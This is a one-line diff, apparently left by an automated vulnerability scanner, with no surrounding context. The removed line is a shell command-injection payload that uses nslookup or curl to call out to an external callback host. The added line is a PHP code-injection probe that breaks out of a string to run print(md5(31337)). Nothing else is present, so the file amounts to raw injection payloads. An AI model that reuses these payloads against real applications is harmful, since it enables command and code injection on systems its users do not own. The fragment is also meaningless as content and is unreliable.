@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitiqraawrejb81720.bxss.me||curl hitiqraawrejb81720.bxss.me)
+";print(md5(31337));$a="
